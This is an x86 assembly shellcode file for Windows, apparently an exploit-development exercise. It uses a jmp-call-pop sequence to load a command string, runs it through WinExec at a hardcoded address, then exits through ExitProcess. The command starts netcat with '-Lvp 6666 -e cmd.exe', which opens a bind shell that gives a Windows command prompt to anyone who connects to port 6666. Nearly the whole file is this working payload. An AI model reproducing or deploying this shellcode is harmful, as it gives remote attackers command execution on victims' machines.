section .txt
	global _start
_start:
	jmp short getcommand
process:
	xor eax, eax		; clearing registers
	pop ebx				; getting cmd.exe in eax
	mov [ebx+35], al	; termination string with null
	mov edx, 0x775b3061	; storing the WinExec Address in registers
	push eax			; push paramenter
	push ebx			; push paramenter
	call edx			; calling WinExec
	
	xor ebx, ebx		; clearing the registers
	mov eax, 0x775379b0	; Storing the ExitProcess Address in registers
	push ebx			; push paramenter
	call eax			; calling ExitProcess to cleanly exit
	
getcommand:
	call process
	dw 'C:\Users\rajat\Downloads\nc -Lvp 6666 -e cmd.exe', 0	; 0 replaces space 